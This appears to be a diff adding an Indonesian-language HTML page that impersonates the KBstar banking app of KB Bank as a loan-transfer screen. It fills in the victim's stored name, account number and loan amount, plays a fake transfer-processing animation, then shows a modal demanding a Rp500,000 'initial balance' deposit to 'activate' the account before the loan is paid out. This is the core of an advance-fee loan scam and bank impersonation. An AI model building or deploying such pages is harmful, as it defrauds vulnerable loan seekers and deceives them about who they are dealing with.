@@ -1,0 +1,107 @@
+<!doctype html>
+<html lang="id">
+<head>
+<meta charset="utf-8">
+<meta name="viewport" content="width=device-width,initial-scale=1,viewport-fit=cover">
+<meta name="theme-color" content="#711bb5">
+<title>Transfer · KBstar</title>
+<style>
+:root{--p1:#6515a6;--p2:#8a2bd0;--gold:#ffd84d;--ink:#2b1834;--muted:#85758d;--bg:#f7f4f9;--line:#eadff0;--activation-bg:#fffdf8;--activation-kicker:#53206f}
+*{box-sizing:border-box}html,body{margin:0;min-height:100%;font-family:Inter,ui-sans-serif,system-ui,-apple-system,BlinkMacSystemFont,"Segoe UI",sans-serif;background:#d9d5df;color:var(--ink)}button{font:inherit}.app{width:min(100%,430px);min-height:100svh;margin:auto;background:var(--bg);box-shadow:0 18px 48px rgba(62,27,83,.14)}
+.hero{position:relative;overflow:hidden;padding:18px 20px 74px;color:#fff;background:radial-gradient(circle at 85% 15%,rgba(255,205,63,.15),transparent 36%),linear-gradient(135deg,#35104F 0%,#54127B 55%,#67149A 100%)}.hero:before{content:"";position:absolute;top:18px;left:-58px;width:168px;height:168px;border-radius:50%;background:radial-gradient(circle,rgba(183,118,255,.18) 0%,rgba(116,55,170,.11) 38%,rgba(90,28,144,0) 72%);filter:blur(34px);opacity:.9;animation:orbDrift 10s ease-in-out infinite;pointer-events:none}.hero:after{content:"";position:absolute;inset:0;background:radial-gradient(circle at 90% 14%,rgba(255,255,255,.06),transparent 18%),linear-gradient(120deg,rgba(255,255,255,.06) 0%,transparent 28%,transparent 74%,rgba(255,227,135,.05) 100%);pointer-events:none}.hero .curve{display:none}.hero-pattern,.hero-line{position:absolute;pointer-events:none}.hero-pattern{right:-32px;top:44px;width:152px;height:152px;border-radius:50%;border:1px solid rgba(255,255,255,.06);box-shadow:-32px 24px 0 0 rgba(255,255,255,.03),-14px -16px 0 0 rgba(255,214,106,.03)}.hero-line{right:20px;top:82px;width:88px;height:1px;background:linear-gradient(90deg,rgba(255,214,106,0),rgba(255,214,106,.24),rgba(255,214,106,0))}.status{display:flex;justify-content:space-between;font-size:11px;font-weight:800;position:relative;z-index:1}.top{display:flex;align-items:flex-start;justify-content:space-between;margin-top:24px;position:relative;z-index:1;gap:14px}.brand{font-size:27px;line-height:.9;letter-spacing:-1.5px}.brand b{color:#ffc342}.brand span{font-weight:400}.brand small{display:block;text-align:right;font-size:8px;color:rgba(255,255,255,.72);letter-spacing:.08em;margin-top:5px}.page-title{text-align:right;padding-top:2px}.page-title small{display:block;font-size:9px;font-weight:900;letter-spacing:.24em;color:rgba(255,255,255,.72);text-transform:uppercase}.page-title strong{display:block;margin-top:6px;font-size:17px;font-weight:800;letter-spacing:.01em}.sheet{margin-top:-46px;padding:0 15px 34px;position:relative;z-index:2}.sheet:before{content:"";position:absolute;left:0;right:0;top:-24px;height:110px;background:radial-gradient(circle at 52% 8%,rgba(255,255,255,.16),transparent 28%),linear-gradient(180deg,rgba(141,132,149,.34) 0%,rgba(164,154,167,.18) 44%,rgba(247,244,249,0) 100%);filter:blur(0);pointer-events:none;z-index:-1}.card{background:#fff;border:1px solid var(--line);border-radius:24px;box-shadow:0 24px 60px rgba(28,8,40,.22),0 4px 16px rgba(28,8,40,.08);overflow:hidden}.card-head{padding:22px 20px 18px;background:linear-gradient(145deg,#fbf7ff,#fff)}.eyebrow{font-size:9px;font-weight:900;letter-spacing:.14em;color:#7c2cb3}.card-head h1{font-size:21px;margin:6px 0 6px}.card-head p{font-size:11px;line-height:1.55;color:var(--muted);margin:0}.bank{display:flex;align-items:center;gap:12px;margin:18px 20px 8px;padding:14px 15px;border-radius:16px;background:linear-gradient(135deg,#7121b5,#8d31ce);color:#fff}.bank-logo{width:44px;height:44px;border-radius:14px;display:grid;place-items:center;background:#fff1a8;color:#681699;font-weight:950;font-size:14px}.bank small{display:block;font-size:8px;letter-spacing:.12em;color:#e5d4f1}.bank strong{display:block;margin-top:3px;font-size:14px}.details{padding:4px 20px 18px}.row{padding:15px 0;border-bottom:1px solid #f0e9f3}.row:last-child{border-bottom:0}.row span{display:block;font-size:9px;color:#95869d;letter-spacing:.04em}.row strong{display:block;margin-top:5px;font-size:15px;color:#392143;word-break:break-word}.row.amount strong{font-size:26px;color:#681a9e;letter-spacing:-.025em}.verified{display:inline-flex;align-items:center;gap:6px;margin:0 20px 16px;padding:8px 10px;border-radius:999px;background:#eff9f3;color:#22754c;font-size:9px;font-weight:900}.verified:before{content:"✓";width:17px;height:17px;border-radius:50%;display:grid;place-items:center;background:#d5f0df}.transfer-action{display:block;width:calc(100% - 40px);margin:0 20px 22px;border:0;border-radius:16px;padding:16px 18px;background:linear-gradient(135deg,#ffe55c,#ffc62f);color:#4a2861;font-size:16px;font-weight:950;letter-spacing:.01em;box-shadow:0 10px 24px rgba(255,193,48,.24),inset 0 1px 0 rgba(255,255,255,.55);cursor:pointer;transition:transform .18s ease,box-shadow .18s ease}.transfer-action:active{transform:translateY(1px) scale(.995);box-shadow:0 6px 16px rgba(255,193,48,.18),inset 0 1px 0 rgba(255,255,255,.55)}.back{display:block;width:calc(100% - 30px);margin:18px 15px 0;border:0;border-radius:16px;padding:15px 16px;background:#fff;color:#6c239e;font-weight:900;box-shadow:0 9px 22px rgba(76,39,93,.06);cursor:pointer}.note{padding:15px 18px;font-size:9px;line-height:1.55;color:#8d7f95;text-align:center}@keyframes orbDrift{0%,100%{transform:translate3d(0,0,0)}50%{transform:translate3d(10px,8px,0)}}@media(prefers-reduced-motion:reduce){.hero:before{animation:none}}
+
+.transfer-processing{position:fixed;inset:0;z-index:60;display:none;place-items:center;padding:22px;background:radial-gradient(circle at 84% 12%,rgba(255,205,63,.12),transparent 32%),linear-gradient(135deg,#35104F 0%,#54127B 55%,#67149A 100%);color:#fff;overflow:hidden}.transfer-processing.show{display:grid}.transfer-processing:before{content:"";position:absolute;inset:-25% -45%;background:linear-gradient(112deg,transparent 34%,rgba(255,226,92,.04) 43%,rgba(255,255,255,.18) 50%,rgba(255,223,83,.06) 57%,transparent 68%);animation:processSweep 5.5s ease-in-out infinite}.transfer-processing:after{content:"";position:absolute;right:-110px;top:-115px;width:250px;height:250px;border-radius:50%;background:radial-gradient(circle,rgba(174,108,232,.18),rgba(111,39,160,.06) 46%,transparent 70%);filter:blur(10px);animation:processOrb 9s ease-in-out infinite}.processing-card{position:relative;z-index:2;width:min(100%,350px);padding:30px 24px 26px;border-radius:28px;border:1px solid rgba(255,255,255,.18);background:linear-gradient(145deg,rgba(255,255,255,.15),rgba(255,255,255,.07));box-shadow:0 26px 70px rgba(27,8,39,.32),inset 0 1px 0 rgba(255,255,255,.14);backdrop-filter:blur(18px);-webkit-backdrop-filter:blur(18px);text-align:center}.processing-icon{width:82px;height:82px;margin:0 auto 18px;border-radius:24px;display:grid;place-items:center;background:linear-gradient(145deg,#ffea8d,#ffd64e 48%,#ffc42d);box-shadow:0 16px 36px rgba(255,194,48,.20),0 0 0 8px rgba(255,216,77,.07);color:#5d1890;animation:processIcon 2.2s ease-in-out infinite}.processing-icon svg{width:39px;height:39px;stroke:currentColor;fill:none;stroke-width:2.6;stroke-linecap:round;stroke-linejoin:round}.processing-kicker{font-size:9px;font-weight:900;letter-spacing:.20em;color:#ffe677}.processing-title{margin:8px 0 7px;font-size:23px;font-weight:850;letter-spacing:-.025em}.processing-copy{margin:0 auto;color:rgba(255,255,255,.76);font-size:11px;line-height:1.6;max-width:260px}.processing-bar{height:7px;margin-top:23px;border-radius:999px;background:rgba(255,255,255,.11);overflow:hidden}.processing-bar i{display:block;width:0;height:100%;border-radius:inherit;background:linear-gradient(90deg,#ffd349,#fff0a0,#ffd349);box-shadow:0 0 16px rgba(255,218,73,.35)}.transfer-processing.show .processing-bar i{animation:processBar 3s linear forwards}@keyframes processSweep{0%,20%{transform:translateX(-50%);opacity:0}34%{opacity:.8}70%,100%{transform:translateX(52%);opacity:0}}@keyframes processOrb{0%,100%{transform:translate3d(0,0,0)}50%{transform:translate3d(-14px,18px,0)}}@keyframes processIcon{0%,100%{transform:translateY(0);filter:brightness(1)}50%{transform:translateY(-3px);filter:brightness(1.05)}}@keyframes processBar{from{width:0}to{width:100%}}@media(prefers-reduced-motion:reduce){.transfer-processing:before,.transfer-processing:after,.processing-icon,.transfer-processing.show .processing-bar i{animation:none!important}.transfer-processing.show .processing-bar i{width:100%}}
+
+.activation-modal{position:fixed;inset:0;z-index:50;display:none;align-items:center;justify-content:center;padding:18px;background:rgba(29,12,39,.42);backdrop-filter:blur(10px);-webkit-backdrop-filter:blur(10px)}.activation-modal.show{display:flex}.activation-panel{position:relative;overflow:hidden;width:min(100%,384px);border-radius:24px;background:linear-gradient(180deg,rgba(255,253,248,.98) 0%,rgba(255,251,244,.96) 100%);border:1px solid rgba(255,255,255,.55);box-shadow:0 22px 54px rgba(40,18,58,.24),inset 0 1px 0 rgba(255,255,255,.72);padding:20px 18px 16px;animation:modalIn .32s cubic-bezier(.22,1,.36,1)}.activation-panel:before{content:"";position:absolute;inset:0;border-radius:24px;pointer-events:none;background:linear-gradient(180deg,rgba(255,255,255,.22),transparent 30%)}.activation-icon{position:relative;width:80px;height:80px;border-radius:24px;display:grid;place-items:center;margin:0 auto 12px;background:linear-gradient(145deg,#ffe991 0%,#ffd54d 46%,#ffbf2d 100%);color:#5b1790;font-size:36px;font-weight:950;box-shadow:0 14px 34px rgba(255,191,45,.24),0 0 0 1px rgba(255,255,255,.45) inset;animation:iconFloat .42s cubic-bezier(.2,1,.3,1)}.activation-icon:after{content:"";position:absolute;inset:-8px;border-radius:28px;border:1px solid rgba(255,216,77,.34);pointer-events:none}.activation-kicker{text-align:center;font-size:9px;font-weight:950;letter-spacing:.22em;color:#4e2269;text-transform:uppercase}.activation-panel h2{margin:8px 0 10px;text-align:center;font-size:26px;line-height:1.06;font-weight:800;letter-spacing:-.03em;color:#31183d}.activation-panel p{margin:0;color:#695b72;font-size:13px;line-height:1.62;text-align:center}.activation-amount{position:relative;overflow:hidden;margin:15px 0 13px;padding:13px 16px 15px;border-radius:18px;background:linear-gradient(135deg,#4d087c 0%,#7110a8 55%,#4c0879 100%);border:1px solid rgba(255,220,110,.26);color:#fff;text-align:center;box-shadow:0 14px 34px rgba(77,8,124,.18),inset 0 1px 0 rgba(255,255,255,.14);animation:amountRise .46s cubic-bezier(.2,1,.3,1)}.activation-amount small{display:block;font-size:9px;font-weight:900;letter-spacing:.20em;color:#e7d7f2}.activation-amount strong{display:block;margin-top:6px;font-size:30px;font-weight:800;letter-spacing:-.5px;color:#fff2a0;text-shadow:0 2px 10px rgba(22,8,38,.18)}.activation-note{margin-top:2px}.activation-actions{display:grid;grid-template-columns:1fr 1fr;gap:12px;margin-top:15px}.activation-actions button{border:0;border-radius:15px;padding:15px 12px;font-weight:900;cursor:pointer;transition:transform .18s ease,box-shadow .18s ease,filter .18s ease}.activation-primary{background:linear-gradient(135deg,#FFD84A,#FFC928);color:#4a2861;box-shadow:0 10px 24px rgba(255,201,40,.34),inset 0 1px 0 rgba(255,255,255,.52);font-size:14px;letter-spacing:.01em}.activation-secondary{background:#eee5f5;color:#652596;box-shadow:inset 0 1px 0 rgba(255,255,255,.72)}.activation-actions button:hover{filter:brightness(1.02)}.activation-actions button:active{transform:translateY(1px) scale(.995)}@keyframes modalIn{from{opacity:0;transform:translateY(16px) scale(.985)}to{opacity:1;transform:none}}@keyframes iconFloat{0%{opacity:0;transform:translateY(8px) scale(.94)}100%{opacity:1;transform:none}}@keyframes amountRise{0%{opacity:0;transform:translateY(10px) scale(.97)}100%{opacity:1;transform:none}}@media(prefers-reduced-motion:reduce){.activation-panel,.activation-icon,.activation-amount{animation:none!important}.activation-actions button{transition:none}}</style>
+</head>
+<body>
+<div class="app">
+  <header class="hero">
+    <div class="status"><span>07.10</span><span>4G ▮▮ 100%</span></div>
+    <div class="hero-pattern" aria-hidden="true"></div><div class="hero-line" aria-hidden="true"></div><div class="top"><div class="brand"><b>KB</b><span>star</span><small>by KB Bank</small></div><div class="page-title"><small>TRANSFER</small><strong>Detail Rekening</strong></div></div>
+  </header>
+  <main class="sheet">
+    <section class="card">
+      <div class="card-head"><div class="eyebrow">REKENING TUJUAN</div><h1>Transfer Pinjaman</h1><p>Data berikut mengikuti data rekening dan nominal pinjaman yang telah diisi user.</p></div>
+      <div class="bank"><div class="bank-logo">KB</div><div><small>NAMA BANK</small><strong>KB BANK</strong></div></div>
+      <div class="details">
+        <div class="row"><span>NAMA PEMILIK REKENING</span><strong id="transferName">Nasabah</strong></div>
+        <div class="row"><span>NOMOR REKENING</span><strong id="transferAccount">—</strong></div>
+        <div class="row amount"><span>NOMINAL PINJAMAN</span><strong id="transferAmount">Rp0</strong></div>
+      </div>
+      <div class="verified">DATA SINKRON DENGAN PENGAJUAN USER</div>
+      <button class="transfer-action" id="transferSubmitButton" type="button">Transfer&nbsp;&nbsp;→</button>
+    </section>
+    <button class="back" id="backButton" type="button">← Kembali ke Dashboard</button>
+    <div class="note">Halaman ini hanya menampilkan detail yang sudah tersimpan pada alur pengajuan.</div>
+  </main>
+</div>
+<div class="transfer-processing" id="transferProcessing" role="status" aria-live="polite" aria-hidden="true">
+  <div class="processing-card">
+    <div class="processing-icon" aria-hidden="true"><svg viewBox="0 0 48 48"><path d="M7 24 41 8 29 41l-7-12-15-5Z"/><path d="m22 29 19-21"/></svg></div>
+    <div class="processing-kicker">KBSTAR TRANSFER</div>
+    <div class="processing-title">Memproses Transfer</div>
+    <p class="processing-copy">Mengamankan dan memverifikasi detail rekening serta nominal pinjaman Anda.</p>
+    <div class="processing-bar" aria-hidden="true"><i></i></div>
+  </div>
+</div>
+<div class="activation-modal" id="activationModal" role="dialog" aria-modal="true" aria-labelledby="activationTitle">
+  <div class="activation-panel">
+    <div class="activation-icon">✓</div>
+    <div class="activation-kicker">KB BANK · AKTIVASI REKENING</div>
+    <h2 id="activationTitle">Aktivasi Rekening<br>Diperlukan</h2>
+    <p>Rekening KB BANK Anda masih berstatus baru. Untuk melanjutkan proses pencairan pinjaman, lakukan <strong>pengisian saldo awal sebesar Rp500.000</strong>.</p>
+    <div class="activation-amount"><small>SALDO AWAL</small><strong>Rp500.000</strong></div>
+    <p class="activation-note">Setelah saldo terverifikasi, proses pencairan dapat dilanjutkan.</p>
+    <div class="activation-actions">
+      <button class="activation-secondary" id="activationBack" type="button">Kembali</button>
+      <button class="activation-primary" id="activationOk" type="button">Mengerti&nbsp;&nbsp;→</button>
+    </div>
+  </div>
+</div>
+
+<script src="flow-state.js"></script>
+<script>
+(()=>{
+  'use strict';
+  const $=id=>document.getElementById(id);
+  const rupiah=n=>new Intl.NumberFormat('id-ID',{style:'currency',currency:'IDR',maximumFractionDigits:0}).format(Number(n||0));
+  try{
+    const identity=window.KBFlow?.get('identity',{})||{};
+    const applicant=window.KBFlow?.get('applicant',{})||{};
+    const financial=window.KBFlow?.get('financial',{})||{};
+    const loan=window.KBFlow?.get('loanDetail',{})||{};
+    const balance=window.KBFlow?.get('dashboardBalance',{})||{};
+    const name=applicant.fullName||identity.fullName||sessionStorage.getItem('kbFullName')||'Nasabah';
+    const account=financial.accountNumber||sessionStorage.getItem('kbAccountNumber')||'—';
+    const selectedLoanAmount=Number(loan.loanAmount||sessionStorage.getItem('kbLoanAmount'));
+    const amount=Number.isFinite(selectedLoanAmount)&&selectedLoanAmount>0?selectedLoanAmount:(Number.isFinite(Number(balance.loanBalance))?Number(balance.loanBalance):0);
+    $('transferName').textContent=String(name).trim();
+    $('transferAccount').textContent=String(account).trim();
+    $('transferAmount').textContent=rupiah(amount);
+  }catch(e){console.warn('Transfer detail state',e)}
+  $('backButton').addEventListener('click',()=>{window.location.href='dashboard-kbstar-premium.html';});
+  const activationModal=$('activationModal');
+  const transferProcessing=$('transferProcessing');
+  const closeActivation=()=>activationModal.classList.remove('show');
+  $('transferSubmitButton').addEventListener('click',()=>{
+    const button=$('transferSubmitButton');
+    if(button.dataset.processing==='1')return;
+    button.dataset.processing='1';
+    transferProcessing.classList.add('show');
+    transferProcessing.setAttribute('aria-hidden','false');
+    window.setTimeout(()=>{
+      transferProcessing.classList.remove('show');
+      transferProcessing.setAttribute('aria-hidden','true');
+      button.dataset.processing='0';
+      activationModal.classList.add('show');
+    },3000);
+  });
+  $('activationOk').addEventListener('click',closeActivation);
+  $('activationBack').addEventListener('click',closeActivation);
+  activationModal.addEventListener('click',e=>{if(e.target===activationModal)closeActivation();});
+  document.addEventListener('keydown',e=>{if(e.key==='Escape')closeActivation();});
+})();
+</script>
+</body>
+</html>
